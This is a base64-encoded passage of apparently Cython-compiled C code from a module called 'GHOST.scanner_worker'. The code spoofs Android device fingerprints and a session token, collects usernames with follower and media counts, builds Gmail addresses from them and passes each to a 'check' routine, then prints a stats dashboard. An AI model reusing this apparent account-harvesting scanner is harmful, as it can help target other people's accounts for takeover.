Jyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTFdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDA1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdF83KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDA1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBfX3B5eF92X21lZGlhX2NvdW50ID0gKChQeU9iamVjdCopX19weXhfdF84KTtcbiAgICAgICAgX19weXhfdF84ID0gMDtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF8xNCA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X18xMCwgX19weXhfdl91c2VybmFtZSwgUHlfTkUpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzE0IDwgMCkpKSBfX1BZWF9FUlIoMCwgNDA3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fcHl4X3RfMTQpIHtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICBfX3B5eF90XzEzID0gX19weXhfdF8xNDtcbiAgICAgICAgICBnb3RvIF9fcHl4X0wxMV9ib29sX2Jpbm9wX2RvbmU7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF84ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl9mb2xsb3dlcl9jb3VudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwLCBQeV9HRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDA3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTQgPCAwKSkpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgaWYgKF9fcHl4X3RfMTQpIHtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICBfX3B5eF90XzEzID0gX19weXhfdF8xNDtcbiAgICAgICAgICBnb3RvIF9fcHl4X0wxMV9ib29sX2Jpbm9wX2RvbmU7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF84ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl9tZWRpYV9jb3VudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzAsIFB5X0dFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzE0ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xNCA8IDApKSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBfX3B5eF90XzEzID0gX19weXhfdF8xNDtcbiAgICAgICAgX19weXhfTDExX2Jvb2xfYmlub3BfZG9uZTo7XG4gICAgICAgIGlmIChfX3B5eF90XzEzKSB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl91c2VybmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQwOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfT3duU3Ryb25nUmVmZXJlbmNlSW5QbGFjZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ21haWxfY29tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDA4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICBfX3B5eF92X2VtYWlsID0gKChQeU9iamVjdCopX19weXhfdF83KTtcbiAgICAgICAgICBfX3B5eF90XzcgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF84ID0gX19weXhfdl9zZWxmO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpO1xuICAgICAgICAgIF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOCwgX19weXhfdl9lbWFpbH07XG4gICAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGVjaywgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgIH1cblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIGdvdG8gX19weXhfTDhfdHJ5X2VuZDtcbiAgICBfX3B5eF9MM19lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gICAgXG4gICAgX19weXhfdF8xNSA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTtcbiAgICBpZiAoX19weXhfdF8xNSkge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5zY2FubmVyX3dvcmtlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF83LCAmX19weXhfdF84LCAmX19weXhfdF8xMikgPCAwKSBfX1BZWF9FUlIoMCwgNDExLCBfX3B5eF9MNV9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfOCk7XG4gICAgICBfX3B5eF92X2UgPSBfX3B5eF90Xzg7XG4gICAgICAge1xuICAgICAgfVxuICAgICAgIHtcbiAgICAgICAge1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDIwO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0wyMDo7XG4gICAgICB9XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuXG4gICAgXG4gICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzQsIF9fcHl4X3RfNSwgX19weXhfdF82KTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzQsIF9fcHl4X3RfNSwgX19weXhfdF82KTtcbiAgICBfX3B5eF9MOF90cnlfZW5kOjtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5zY2FubmVyX3dvcmtlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdXNlcl9pZCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9tb2RlbF9udW1iZXIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYW5kcm9pZF92ZXJzaW9uKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RwaSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNvbHV0aW9uKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2JyYW5kKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2J1aWxkX3N1ZmZpeCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl91c2VyX2FnZW50KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2xzZF90b2tlbik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZWFkZXJzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RhdGEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdXNlcl9pbmZvKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJuYW1lKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2ZvbGxvd2VyX2NvdW50KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X21lZGlhX2NvdW50KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2VtYWlsKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfMjdjcmVhdGVfZGFzaGJvYXJkKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0dF81R0hPU1RfMjdjcmVhdGVfZGFzaGJvYXJkID0geyJjcmVhdGVfZGFzaGJvYXJkIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydHRfNUdIT1NUXzI3Y3JlYXRlX2Rhc2hib2FyZCwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8yN2NyZWF0ZV9kYXNoYm9hcmQoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBQeU9iamVjdCAqX19weXhfdl9zZWxmID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiY3JlYXRlX2Rhc2hib2FyZCAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDQxNCwgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDQxNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImNyZWF0ZV9kYXNoYm9hcmQiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQxNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY3JlYXRlX2Rhc2hib2FyZCIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgNDE0LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDQxNCwgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTtcbiAgfVxuICBnb3RvIF9fcHl4X0w2X3NraXA7XG4gIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjtcbiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNyZWF0ZV9kYXNoYm9hcmQiLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCA0MTQsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuY3JlYXRlX2Rhc2hib2FyZCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJ0dF81R0hPU1RfMjZjcmVhdGVfZGFzaGJvYXJkKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZik7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0dF81R0hPU1RfMjZjcmVhdGVfZGFzaGJvYXJkKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzM7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF84WzZdO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjcmVhdGVfZGFzaGJvYXJkIiwgMCk7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IE5VTEw7XG4gIF9fcHl4X3RfMyA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1NUQVRTfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X2J1aWx0aW5fcHJpbnQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQxNSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IE5VTEw7XG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQxNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dSRUVOKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDE3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDE3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldF9jb3VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDE3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhf